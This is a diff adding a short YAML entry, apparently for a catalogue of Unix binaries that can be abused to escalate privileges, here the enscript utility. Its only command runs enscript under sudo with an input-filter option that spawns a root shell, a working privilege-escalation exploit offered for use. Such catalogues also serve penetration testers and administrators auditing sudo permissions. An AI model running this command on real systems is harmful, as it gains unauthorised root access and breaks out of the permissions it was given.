@@ -1,0 +1,4 @@
+name: enscript
+binary_path: /usr/bin/enscript
+exploit_cmds:
+- sudo /usr/bin/enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
